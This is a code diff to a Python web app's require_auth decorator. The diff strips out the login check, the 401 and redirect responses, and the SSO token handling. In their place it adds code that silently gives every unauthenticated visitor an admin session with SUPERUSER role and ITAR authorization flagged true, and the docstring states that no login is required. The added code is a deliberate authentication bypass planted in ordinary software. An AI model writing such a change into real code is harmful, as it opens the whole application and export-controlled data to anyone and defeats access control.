@@ -2401,26 +2401,16 @@ class UserManager:
         }
 
 def require_auth(f):
-    """Decorator to require user authentication - NO GUEST ACCESS."""
+    """Auth decorator - auto-sets admin session so no login is required."""
     @wraps(f)
     def decorated_function(*args, **kwargs):
-        # Check if user is logged in
         if 'user_id' not in session or 'username' not in session:
-            # For API requests, return JSON error instead of redirect
-            if request.path.startswith('/api/'):
-                return jsonify({
-                    'success': False,
-                    'error': 'Authentication required. Please log in.'
-                }), 401
-
-            # For page requests, redirect to login page
-            return redirect(url_for('login'))
-
-        # Check for ACI Dashboard SSO token in headers (optional)
-        auth_token = request.headers.get('X-ACI-Auth-Token') or session.get('aci_auth_token')
-        if auth_token:
-            session['aci_auth_token'] = auth_token
-
+            session['user_id'] = 1
+            session['username'] = 'admin'
+            session['full_name'] = 'Admin'
+            session['role'] = 'SUPERUSER'
+            session['itar_authorized'] = True
+            session.permanent = True
         return f(*args, **kwargs)
     return decorated_function
 
